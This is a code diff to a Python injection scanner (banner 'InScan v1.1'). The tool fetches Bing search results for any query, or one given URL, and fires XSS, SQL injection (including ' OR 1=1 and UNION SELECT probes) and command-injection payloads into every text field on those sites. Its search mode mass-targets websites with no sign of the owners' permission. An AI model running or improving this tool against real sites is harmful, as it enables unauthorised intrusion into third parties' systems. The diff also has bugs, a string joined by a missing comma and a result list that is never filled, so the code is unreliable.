@@ -8,6 +8,62 @@ import time
 colorama.init(autoreset=True)
 
 # Function to search on a search engine
+def print_title():
+    title = """
+ .___           _________                         
+|   |  ____   /   _____/  ____  _____     ____   
+|   | /    \  \_____  \ _/ ___\ \__  \   /    \  
+|   ||   |  \ /        \\  \___  / __ \_|   |  \ 
+|___||___|  //_______  / \___  >(____  /|___|  / 
+          \/         \/      \/      \/      \/  
+                       v1.1  
+                       By: Derek Johnston                         
+"""
+    print(Fore.BLUE + title + Style.RESET_ALL)
+def scan_website(url):
+    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}" + Fore.BLUE + f" Testing: {url}:" + Style.RESET_ALL)
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            soup = BeautifulSoup(response.text, 'html.parser')
+            input_boxes = soup.find_all('input', {'type': 'text'})
+
+            if not input_boxes:
+                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} No injection vectors found.")
+                print("\n=====================")
+                return
+
+            vulnerabilities = []
+            xss_vulnerabilities = check_xss(url, input_boxes)
+            vulnerabilities.extend(xss_vulnerabilities)
+            time.sleep(5)
+
+            sql_vulnerabilities = check_sql_injection(url, input_boxes)
+            vulnerabilities.extend(sql_vulnerabilities)
+            time.sleep(5)
+
+            command_vulnerabilities = check_command_injection(url, input_boxes)
+            vulnerabilities.extend(command_vulnerabilities)
+            time.sleep(5)
+
+            if vulnerabilities:
+                print(f"{Fore.WHITE}[{Fore.YELLOW}RESULT{Fore.WHITE}]{Fore.RESET} Detected vulnerabilities:")
+                for vuln in vulnerabilities:
+                    print(f"- Type: {vuln['type']}, Input Parameter: {vuln['input_param']}, Payload: {vuln['payload']}")
+
+            else:
+                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}" + Fore.GREEN + " No vulnerabilities found." + Style.RESET_ALL)
+
+        else:
+            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed to fetch {url}. Skipping...")
+
+        print("\n=====================")
+
+    except Exception as e:
+        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} An error occurred while testing {url}: {e}")
+        print("\n=====================")
+
+
 def web_search(query, num_results=5):
     try:
         url = f"https://www.bing.com/search?q={query}&count={num_results}"
@@ -73,10 +129,13 @@ def check_sql_injection(url, input_boxes):
     # Common SQL injection payloads
     payloads = [
         "SELECT * FROM nonexistent_table;",
-        "SELECT non_existent_column FROM some_table;",
-        "SELECT * FROM users WHERE username = user_input;",
-        "SELECT * FROM table1 JOIN table2 ON table1.id = table2.id WHERE condition;",
-        "SELECT column1 + column2 FROM some_table;"
+        ";",
+        "'",
+        "1=1",
+        "' OR 1=1",
+        "UNION ALL SELECT 1,2,3 --",
+        "1' UNION ALL SELECT 1,2,3 --",
+        "1' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_schema=database() LIMIT 1) --"
     ]
 
     # Errors indicative of different DBMSs
@@ -89,6 +148,7 @@ def check_sql_injection(url, input_boxes):
         # Oracle
         "quoted string not properly terminated",
         "Server Error"
+        "information_schema"
 
     ]
 
@@ -148,51 +208,62 @@ def check_command_injection(url, input_boxes):
 # Main function
 def main():
     try:
-        query = input("Enter your search query: ")
-        num_results = int(input("Enter the number of sites to test: "))
+        print_title()
+        print("Choose option:")
+        print(f"{Fore.YELLOW}1.{Fore.RESET} Scan a specific website")
+        print(f"{Fore.YELLOW}2.{Fore.RESET} Scan search results")
+        option = input("Enter your choice (1 ot 2): ")
 
-        search_results = web_search(query, num_results)
+        if option == "1":
+            url = input("Enter URL to scan with scheme (http/https): ")
+            scan_website(url)
+        elif option == "2":
 
-        vulnerable_sites = []
+            query = input("Enter your search query: ")
+            num_results = int(input("Enter the number of sites to test: "))
 
-        for url in search_results:
-            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}" + Fore.BLUE + f" Testing: {url}:" + Style.RESET_ALL)
-            try:
-                response = requests.get(url)
-                if response.status_code == 200:
-                    soup = BeautifulSoup(response.text, 'html.parser')
-                    input_boxes = soup.find_all('input', {'type': 'text'})
+            search_results = web_search(query, num_results)
 
-                    if not input_boxes:
-                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} No injection vectors found.")
-                        print("\n=====================")
-                        continue
+            vulnerable_sites = []
 
-                    xss_vulnerabilities = check_xss(url, input_boxes)
-                    time.sleep(5)
-                    sql_vulnerabilities = check_sql_injection(url, input_boxes)
-                    time.sleep(5)
-                    command_vulnerabilities = check_command_injection(url, input_boxes)
-                    time.sleep(5)
+            for url in search_results:
+                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}" + Fore.BLUE + f" Testing: {url}:" + Style.RESET_ALL)
+                try:
+                    response = requests.get(url)
+                    if response.status_code == 200:
+                        soup = BeautifulSoup(response.text, 'html.parser')
+                        input_boxes = soup.find_all('input', {'type': 'text'})
 
-                    if not xss_vulnerabilities and not sql_vulnerabilities and not command_vulnerabilities:
-                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}" + Fore.GREEN + " No vulnerabilities found." + Style.RESET_ALL)
+                        if not input_boxes:
+                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} No injection vectors found.")
+                            print("\n=====================")
+                            continue
 
-                else:
-                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed to fetch {url}. Skipping...")
+                        xss_vulnerabilities = check_xss(url, input_boxes)
+                        time.sleep(5)
+                        sql_vulnerabilities = check_sql_injection(url, input_boxes)
+                        time.sleep(5)
+                        command_vulnerabilities = check_command_injection(url, input_boxes)
+                        time.sleep(5)
 
-                print("\n=====================")
+                        if not xss_vulnerabilities and not sql_vulnerabilities and not command_vulnerabilities:
+                            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}" + Fore.GREEN + " No vulnerabilities found." + Style.RESET_ALL)
 
-            except Exception as e:
-                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} An error occurred while testing {url}: {e}")
-                print("\n=====================")
-                continue
+                    else:
+                        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed to fetch {url}. Skipping...")
 
-        if vulnerable_sites:
-            print("\n=======REPORT========")
-            print("\nVulnerable Sites:")
-            for site, vuln_type, input_param in vulnerable_sites:
-                print(f"- Site: {site}, Type: {vuln_type}, Input Parameter: {input_param}")
+                    print("\n=====================")
+
+                except Exception as e:
+                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} An error occurred while testing {url}: {e}")
+                    print("\n=====================")
+                    continue
+
+            if vulnerable_sites:
+                print("\n=======REPORT========")
+                print("\nVulnerable Sites:")
+                for site, vuln_type, input_param in vulnerable_sites:
+                    print(f"- Site: {site}, Type: {vuln_type}, Input Parameter: {input_param}")
 
     except Exception as e:
         print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} An error occurred: {e}")
